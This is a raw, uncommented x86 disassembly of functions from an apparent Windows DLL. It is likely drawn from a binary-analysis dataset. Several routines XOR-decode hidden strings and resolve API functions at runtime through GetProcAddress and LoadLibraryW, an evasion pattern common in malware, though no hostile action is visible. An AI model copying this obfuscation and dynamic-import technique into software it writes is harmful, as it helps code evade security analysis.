call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ r--data ]
xor cl cl
xor eax eax
lea eax [ edi + 0x64 ]
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov dl [ eax + esi ]
xor dl cl
xor dl 0xa5
inc cl
mov [ ebp + eax - 0x3c ] dl
movzx eax cl
cmp eax 0xb
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x31 ] 0x0
xor eax eax
jmp r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0x6c
inc cl
mov [ ebp + eax - 0x18 ] dl
movzx eax cl
cmp eax 0x8
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x10 ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0x6d
inc cl
mov [ ebp + eax - 0x24 ] dl
movzx eax cl
cmp eax 0x9
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x1b ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0xbc
inc cl
mov [ ebp + eax - 0x30 ] dl
movzx eax cl
cmp eax 0xb
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x25 ] 0x0
xor eax eax
lea esp [ esp ]
mov dl [ eax + esi ]
xor dl cl
xor dl 0x73
inc cl
mov [ ebp + eax - 0x6c ] dl
movzx eax cl
cmp eax 0xc
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x60 ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0xe4
inc cl
mov [ ebp + eax - 0x4c ] dl
movzx eax cl
cmp eax 0xc
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x40 ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0xe3
inc cl
mov [ ebp + eax - 0xa4 ] dl
movzx eax cl
cmp eax 0x13
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x91 ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0x42
inc cl
mov [ ebp + eax - 0x5c ] dl
movzx eax cl
cmp eax 0xc
jb r-xdata
mov esi [ GetProcAddress@IAT ]
lea eax [ ebp - 0x3c ]
push eax
push edi
mov [ ebp - 0x50 ] 0x0
call esi
lea ecx [ ebp - 0x11c ]
mov [ rw-data ] eax
mov [ ebp - 0x11c ] ecx
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call esi
cmp [ ebp - 0x11c ] 0x0
mov [ rw-data ] eax
jne r-xdata
lea edx [ ebp - 0x24 ]
push edx
push edi
call esi
cmp [ ebp - 0x11c ] 0x0
mov [ rw-data ] eax
jne r-xdata
lea ecx [ ebp - 0x30 ]
push ecx
push edi
call esi
lea edx [ ebp - 0x6c ]
push edx
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x4c ]
push eax
push edi
call esi
lea ecx [ ebp - 0xa4 ]
push ecx
push edi
mov [ rw-data ] eax
call esi
lea edx [ ebp - 0x5c ]
push edx
push edi
mov [ rw-data ] eax
call esi
mov edi [ r--data ]
mov [ rw-data ] eax
xor cl cl
xor eax eax
nop
mov dl [ eax + edi ]
xor dl cl
xor dl 0xac
inc cl
mov [ ebp + eax - 0x7c ] dl
movzx eax cl
cmp eax 0xc
jb r-xdata
push ebx
lea eax [ ebp - 0x7c ]
push eax
mov [ ebp - 0x70 ] 0x0
call [ GetModuleHandleA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov edi [ r--data ]
xor cl cl
xor eax eax
jmp r-xdata
pop ebx
pop esi
mov eax 0xc8
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov dl [ eax + edi ]
xor dl cl
xor dl 0xac
inc cl
mov [ ebp + eax - 0xc0 ] dl
movzx eax cl
cmp eax 0x18
jb r-xdata
mov edi [ r--data ]
xor cl cl
mov [ ebp - 0xa8 ] 0x0
xor eax eax
lea ebx [ ebx ]
mov dl [ edi + eax ]
xor dl cl
xor dl 0x71
inc cl
mov [ ebp + eax - 0x90 ] dl
movzx eax cl
cmp eax 0x10
jb r-xdata
mov edi [ r--data ]
xor cl cl
mov [ ebp - 0x80 ] 0x0
xor eax eax
mov dl [ edi + eax ]
xor dl cl
xor dl 0xa6
inc cl
mov [ ebp + eax - 0x118 ] dl
movzx eax cl
cmp eax 0x1c
jb r-xdata
mov edi [ r--data ]
xor cl cl
mov [ ebp - 0xfc ] 0x0
xor eax eax
mov dl [ edi + eax ]
xor dl cl
xor dl 0xc9
inc cl
mov [ ebp + eax - 0xf8 ] dl
movzx eax cl
cmp eax 0x19
jb r-xdata
mov edi [ r--data ]
xor cl cl
mov [ ebp - 0xdf ] 0x0
xor eax eax
jmp r-xdata
mov dl [ edi + eax ]
xor dl cl
xor dl 0x8b
inc cl
mov [ ebp + eax - 0xc ] dl
movzx eax cl
cmp eax 0x7
jb r-xdata
lea eax [ ebp - 0xc0 ]
push eax
push ebx
mov [ ebp - 0x5 ] 0x0
call esi
lea ecx [ ebp - 0x90 ]
push ecx
push ebx
mov [ rw-data ] eax
call esi
lea edx [ ebp - 0x118 ]
push edx
push ebx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0xf8 ]
push eax
push ebx
call esi
lea ecx [ ebp - 0xc ]
push ecx
push ebx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov [ rw-data ] sub_100286b0
mov [ rw-data ] sub_100094b0
mov [ rw-data ] sub_1000be20
mov [ rw-data ] sub_10037740
mov [ rw-data ] sub_100114b0
mov [ rw-data ] sub_1000fb00
mov [ rw-data ] sub_10019290
mov [ rw-data ] sub_10002bf0
mov [ rw-data ] sub_10046f90
mov [ rw-data ] sub_1003fd10
mov [ rw-data ] sub_100181e0
mov [ rw-data ] sub_10062e30
mov [ rw-data ] sub_1002d490
mov [ rw-data ] sub_100248d0
mov [ rw-data ] sub_100484d0
mov eax 0x1
lea ecx [ ecx ]
mov ecx [ ebp - 0x4 ]
pop ebx
pop esi
xor ecx ebp
pop edi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
inc eax
cmp eax 0x1d
jl r-xdata
cmp [ eax * 4 + rw-data ] 0x0
je r-xdata
xor eax eax
mov cl 0x38
xor [ eax + rw-data ] cl
inc eax
cmp eax 0x190
jb r-xdata
xor eax eax
sub_100211a0
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_100211dd
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1000363b
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002868d
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100029f0
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x18
sub_10021250
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
pop esi
retn
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
sub_10021277
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003a4d1
add esp 0x14
pop ebp
retn 0x10
sub_100212a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007ff43
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
mov edx 0x7
xor ecx ecx
xor esi esi
mov [ eax + 0x14 ] edx
mov [ eax + 0x10 ] ecx
mov [ ebp - 0x6c ] eax
mov [ eax ] si
mov [ ebp - 0x4 ] ecx
mov [ eax + 0x30 ] edx
xor edx edx
mov [ eax + 0x2c ] ecx
mov [ eax + 0x1c ] dx
push ecx
push ecx
push 0xffffffff
push edi
push ecx
mov [ ebp - 0x4 ] 0x1
push ecx
mov [ eax + 0x38 ] ecx
mov [ eax + 0x3c ] 0x1
call [ MultiByteToWideChar@IAT ]
lea ebx [ eax + eax + 0x2 ]
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x6c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
push ebx
push esi
push 0xffffffff
push edi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
lea eax [ ebp - 0x70 ]
push eax
push esi
call [ CommandLineToArgvW@IAT ]
mov edi eax
xor esi esi
cmp edi esi
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax 0x87
call sub_1001bb80
lea edx [ ebp - 0x24 ]
mov eax 0x138
call sub_1001bb80
lea edx [ ebp - 0x4c ]
mov eax 0xff
call sub_1001bb80
lea edx [ ebp - 0x34 ]
lea eax [ esi + 0x78 ]
call sub_1001bb80
xor ebx ebx
cmp [ ebp - 0x70 ] esi
jle r-xdata
jmp r-xdata
lea eax [ ebp - 0x18 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
mov edx [ edi + ebx * 4 ]
sar eax 0x1
push eax
lea ecx [ ebp - 0x18 ]
push ecx
push edx
call sub_1001a788
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x24 ]
lea edx [ eax + 0x2 ]
jmp r-xdata
lea eax [ ebp - 0x18 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
mov ecx [ edi + ebx * 4 ]
sub eax edx
sar eax 0x1
lea ecx [ ecx + eax * 2 ]
xor edx edx
mov eax ecx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x54 ] 0x7
mov [ ebp - 0x68 ] dx
lea esi [ eax + 0x2 ]
lea ebx [ ebx ]
sub eax edx
sar eax 0x1
push eax
mov eax [ edi + ebx * 4 ]
lea edx [ ebp - 0x24 ]
push edx
push eax
call sub_1001a788
add esp 0xc
test eax eax
jne r-xdata
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x68 ]
call sub_1005e3c0
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x6c ]
jmp r-xdata
lea eax [ ebp - 0x4c ]
lea edx [ eax + 0x2 ]
lea eax [ ebp - 0x24 ]
lea edx [ eax + 0x2 ]
mov edi edi
lea eax [ ebp - 0x68 ]
push eax
call sub_10051390
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x54 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax [ edi + ebx * 4 ]
lea edx [ ebp - 0x4c ]
push edx
push eax
call sub_1001a788
add esp 0xc
test eax eax
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
mov ecx [ edi + ebx * 4 ]
sub eax edx
sar eax 0x1
lea ecx [ ecx + eax * 2 ]
xor edx edx
mov eax ecx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x54 ] 0x7
mov [ ebp - 0x68 ] dx
lea esi [ eax + 0x2 ]
lea ebx [ ebx ]
inc ebx
cmp ebx [ ebp - 0x70 ]
jl r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_10065045
add esp 0x4
jmp r-xdata
lea eax [ ebp - 0x34 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
lea eax [ ebp - 0x4c ]
lea edx [ eax + 0x2 ]
jmp r-xdata
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x68 ]
call sub_1005e3c0
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x6c ]
add ecx 0x1c
xor esi esi
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax [ edi + ebx * 4 ]
lea edx [ ebp - 0x34 ]
push edx
push eax
call sub_1001a788
add esp 0xc
test eax eax
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
lea eax [ ebp - 0x34 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov ecx [ edi + ebx * 4 ]
sub eax edx
sar eax 0x1
lea edx [ ecx + eax * 2 ]
push edx
call [ StrToIntW@IAT ]
mov ecx [ ebp - 0x6c ]
mov [ ecx + 0x38 ] eax
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
mov ecx [ edi + ebx * 4 ]
sub eax edx
sar eax 0x1
lea edx [ ecx + eax * 2 ]
push edx
call [ StrToIntW@IAT ]
mov ecx [ ebp - 0x6c ]
mov [ ecx + 0x3c ] eax
sub_100215bd
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx ecx
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
push edi
mov edi [ ebp + 0x14 ]
movzx eax [ esi ]
push [ ebp + 0x10 ]
mov ecx ebx
push eax
call sub_10020833
add esi 0x2
mov [ edi ] al
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_100215f4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_10048623
call sub_1004093d
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_10021620
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ecx + 0x14 ]
push esi
mov esi eax
mov eax [ ecx + 0x10 ]
mov edx [ esi + 0x10 ]
sub ebx eax
mov [ ebp - 0x4 ] 0x0
cmp edx ebx
jbe r-xdata
push 0xffffffff
push 0x0
push esi
call sub_1000c1e0
xor edx edx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
push eax
mov ecx edi
mov [ edi ] dx
call sub_10051390
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ esi + 0x14 ]
sub ebx edx
cmp ebx eax
jb r-xdata
push 0x0
push ecx
or eax 0xffffffff
call sub_10055aa0
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
push eax
mov ecx edi
call sub_10051390
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn
sub_100216c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f484
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
xor ebx ebx
push ebx
call sub_100067d1
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] bl
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] bl
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] bl
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] bl
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
push eax
push esi
call sub_10060174
add esp 0x8
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp + 0x8 ] r--data
call sub_10052185
push r--data
lea ecx [ ebp - 0x1c ]
push ecx
mov [ ebp - 0x1c ] r--data
call sub_1002050e
sub_10021770
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x40 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x2c ] cx
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov eax [ esi + 0x2c ]
push eax
call sub_10065045
add esp 0x4
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] 0x0
xor eax eax
mov [ esi + 0xc ] ax
pop esi
retn
mov edx [ esi + 0xc ]
push edx
call sub_10065045
add esp 0x4
sub_100217d0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10009180
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ rw-data ]
xor edi edi
xor eax eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x60 ]
push eax
mov ecx esi
call sub_100073c0
cmp eax edi
jne r-xdata
lea ecx [ ebp - 0x3c ]
call sub_1000c2f0
test eax eax
jne r-xdata
lea ebx [ esi + 0xd7c ]
push ebx
lea ecx [ ebp - 0x60 ]
push ecx
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
call sub_10027030
cmp eax [ esi + 0xd58 ]
je r-xdata
lea ebx [ esi + 0xd5c ]
push ebx
lea eax [ ebp - 0x3c ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x60 ]
push edx
push ebx
lea ecx [ edi + 0x12 ]
call sub_10067840
mov edi 0x1
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x4 ] 0xfffffffe
mov eax edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov [ esi + 0xd58 ] eax
mov edi 0x1
jmp r-xdata
lea ecx [ ebp - 0x3c ]
push ecx
push ebx
mov ecx 0x10
call sub_10067840
mov edi 0x1
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x64 ] edi
sub_10021910
push ebp
mov ebp esp
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push esi
push edi
mov edi [ rw-data ]
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x47
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x18 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffb4
and edx 0xff
mov [ ebp + eax * 2 - 0x14 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x8 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff85
and edx 0xff
mov [ ebp + eax * 2 - 0xa0 ] dx
inc eax
cmp eax 0x1e
jb r-xdata
lea ecx [ ebp - 0xa0 ]
xor eax eax
push ecx
lea ecx [ edi + 0xda0 ]
mov edx edi
mov [ ebp - 0x64 ] ax
call sub_10063c90
test eax eax
jne r-xdata
mov esi [ edi + 0xda0 ]
cmp esi [ edi + 0xda4 ]
je r-xdata
mov edx [ edi + 0xda0 ]
cmp edx [ edi + 0xda4 ]
je r-xdata
mov ecx [ r--data ]
xor eax eax
lea ebx [ ebx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffc5
and edx 0xff
mov [ ebp + eax * 2 - 0x60 ] dx
inc eax
cmp eax 0x1d
jb r-xdata
lea ecx [ ebp - 0x60 ]
xor eax eax
push ecx
lea ecx [ edi + 0xdb0 ]
mov edx edi
mov [ ebp - 0x26 ] ax
call sub_10063c90
test eax eax
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov edx esi
lea ecx [ ebp - 0x14 ]
call sub_10018330
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
mov esi [ edi + 0xdb0 ]
cmp esi [ edi + 0xdb4 ]
je r-xdata
mov edx [ edi + 0xdb0 ]
cmp edx [ edi + 0xdb4 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ edi + 0xdc0 ] 0x1
pop edi
xor ecx ebp
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x24 ]
push eax
mov edx esi
lea ecx [ ebp - 0x14 ]
call sub_10018330
add esi 0x1c
cmp esi [ edi + 0xdb4 ]
jne r-xdata
sub_10021a98
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_100616c6
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
push 0x0
push edi
mov ecx esi
call sub_10064dae
test al al
je r-xdata
pop edi
push [ ebp + 0xc ]
mov ecx esi
push ebx
push [ esi + 0x10 ]
call sub_1001df4d
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_10021b00
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x70 ] ecx
push edi
mov ecx ebx
mov [ ebp - 0x68 ] eax
call sub_100684f0
test eax eax
je r-xdata
mov eax [ ebx + 0x1c ]
xor edi edi
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x64 ] edi
mov edx [ eax ]
mov edx [ edx + 0x88 ]
push ecx
push eax
call edx
test eax eax
jns r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0xb5
call sub_1000a6f0
mov eax 0x1
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x64 ]
push eax
call [ SysStringLen@IAT ]
mov esi eax
mov [ ebp - 0x6c ] esi
cmp [ ebx + 0x140 ] edi
je r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x129
call sub_1000a6f0
lea eax [ edi + 0x2 ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
add esi edi
add esi esi
push esi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x68 ]
mov [ ecx ] eax
test eax eax
jne r-xdata
push r--data
call [ lstrlenA@IAT ]
mov edi eax
cmp [ ebx + 0x140 ] 0x0
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x24
call sub_1000a6f0
mov eax 0x3
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x6c ]
mov ecx [ ebp - 0x64 ]
lea eax [ edx + edx ]
mov edx [ ebp - 0x68 ]
push eax
mov eax [ edx ]
push ecx
add eax edi
push eax
call sub_10078600
mov eax [ ebp - 0x64 ]
mov ecx [ ebp - 0x70 ]
add esp 0xc
mov [ ecx ] esi
test eax eax
je r-xdata
push edi
push r--data
push eax
call sub_10078600
add esp 0xc
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
push eax
call [ SysFreeString@IAT ]
sub_10021c50
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ rw-data ]
push esi
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x28 ]
push ecx
push edx
push ebx
call eax
mov ecx [ ebp - 0x4 ]
add esp 0xc
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ r--data ]
lea ebx [ ebx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff97
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0xa
jb r-xdata
lea ecx [ ebp - 0x24 ]
xor eax eax
push ecx
mov [ ebp - 0x10 ] ax
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
lea edi [ ebp - 0xc ]
xor eax eax
call sub_10064fb0
mov edx edi
push edx
push esi
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
pop edi
test eax eax
jne r-xdata
lea eax [ esi + 0x1 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10021d17
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_1007cd03
mov [ rw-data ] 0x1
call sub_1003d2a1
pop ecx
sub_10021d50
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f3ec
mov eax [ fs : 0x0 ]
push eax
sub esp 0x13c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov esi ecx
mov [ ebp - 0x144 ] esi
mov [ ebp - 0x128 ] ebx
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x138 ] ebx
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x130 ] ebx
mov [ ebp - 0x12c ] ebx
mov [ ebp - 0x140 ] ebx
mov [ ebp - 0x13c ] ebx
mov [ ebp - 0x4 ] 0x3
cmp esi ebx
jne r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x9b
call sub_1001bb80
push esi
lea edx [ ebp - 0x128 ]
lea ecx [ ebp - 0x4c ]
call sub_10053a60
test eax eax
je r-xdata
lea esi [ ebp - 0x140 ]
call sub_100173d0
lea esi [ ebp - 0x130 ]
call sub_100173d0
lea esi [ ebp - 0x138 ]
call sub_100173d0
lea esi [ ebp - 0x128 ]
call sub_100173d0
lea eax [ ebx + 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x128 ]
mov edx [ eax ]
mov esi 0x104
mov eax rw-data
xor edi edi
lea esi [ ebp - 0x140 ]
call sub_100173d0
lea esi [ ebp - 0x130 ]
call sub_100173d0
lea esi [ ebp - 0x138 ]
call sub_100173d0
lea esi [ ebp - 0x128 ]
call sub_100173d0
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
